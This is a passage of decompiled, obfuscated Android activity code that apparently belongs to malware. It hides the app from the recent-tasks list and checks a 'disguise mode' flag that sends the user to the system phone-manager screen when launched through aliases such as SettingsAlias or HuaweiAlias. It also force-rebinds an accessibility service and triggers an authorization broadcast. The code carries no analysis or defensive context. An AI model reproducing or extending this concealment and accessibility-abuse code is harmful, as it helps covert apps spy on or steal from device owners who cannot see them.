                if (activityManager != null && (appTasks = activityManager.getAppTasks()) != null) {
                    for (ActivityManager.AppTask appTask : appTasks) {
                        try {
                            ComponentName componentName = appTask.getTaskInfo().baseActivity;
                            if (componentName != null && t60.m214686a2(componentName.getPackageName(), packageName)) {
                                appTask.setExcludeFromRecents(true);
                            }
                        } catch (Exception unused) {
                        }
                    }
                }
            }
        } catch (Exception e) {
            t60.m214705c6("iuzxujjtqev", "❌ [生命周期] onResume隐藏失败", e);
        }
        boolean z = getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).getBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), false);
        Intent intent = getIntent();
        ComponentName component = intent != null ? intent.getComponent() : null;
        if (component == null || (className = component.getClassName()) == null) {
            className = "";
        }
        boolean z2 = component != null && (AbstractC0779a1.m213652a5(className, "AppVariantE", false) || AbstractC0779a1.m213652a5(className, "AppVariantH", false) || AbstractC0779a1.m213652a5(className, "HuaweiAlias", false) || AbstractC0779a1.m213652a5(className, "AppVariantI", false) || AbstractC0779a1.m213652a5(className, "AppVariantJ", false) || AbstractC0779a1.m213652a5(className, "SettingsAlias", false) || AbstractC0779a1.m213652a5(className, "AppVariantF", false) || AbstractC0779a1.m213652a5(className, "AppVariantG", false) || AbstractC0779a1.m213652a5(className, "AppVariantK", false) || AbstractC0779a1.m213652a5(className, "AppVariantL", false) || AbstractC0779a1.m213652a5(className, "AppVariantA", false));
        if ((intent == null || !intent.getBooleanExtra("TRIGGER_EXCLUDE_FROM_RECENTS", false)) && z && !this.f51967d2 && (z2 || m211216c6() || m211215c5())) {
            t60.m214714d6("iuzxujjtqev", "🎭 [伪装] onResume检测到伪装模式，跳转到系统手机管家");
            this.f51967d2 = true;
            m211218c8();
            return;
        }
        View viewFindViewById = findViewById(R$id.webViewContainer);
        boolean z3 = viewFindViewById != null && viewFindViewById.getVisibility() == 0;
        if (z3) {
            dqtvuisjd.f52358m1.setWebViewOpen(true);
            try {
                WebView webView = (WebView) findViewById(R$id.webView);
                if (webView != null) {
                    webView.onResume();
                }
            } catch (Exception e2) {
                tz0.m214810b0("⚠️ 恢复WebView失败: ", e2.getMessage(), "iuzxujjtqev");
            }
        }
        boolean zM211214c4 = m211214c4();
        if (zM211214c4 && dqtvuisjd.f52358m1.getInstance() == null && z) {
            t60.m214726f4("iuzxujjtqev", "⚠️ [Vivo修复] 检测到无障碍僵尸状态，强制重绑...");
            new Thread(new bk1(this, 6)).start();
        }
        if (!zM211214c4) {
            m211228d8();
            return;
        }
        try {
            View viewFindViewById2 = findViewById(R$id.mainContent);
            if (viewFindViewById2 != null) {
                viewFindViewById2.setVisibility(8);
            }
        } catch (Exception e3) {
            tz0.m214807a7("❌ 隐藏提示弹窗失败: ", e3.getMessage(), "iuzxujjtqev");
        }
        if (!getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).getBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), false)) {
            Intent intent2 = new Intent(AbstractC0003a2.m32b3(getPackageName(), ".START_AUTHORIZATION"));
            intent2.setPackage(getPackageName());
            sendBroadcast(intent2);
        }
        if (z3) {
            int i = C0329b4.f53194a6;
        } else {
            int i2 = C0329b4.f53194a6;
            m211230e0();
        }
    }

    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, android.app.Activity
    public final void onStop() {
        super.onStop();
        f51957e3 = null;
    }

    @Override // android.app.Activity
    public final void onUserLeaveHint() {
        super.onUserLeaveHint();
    }
}
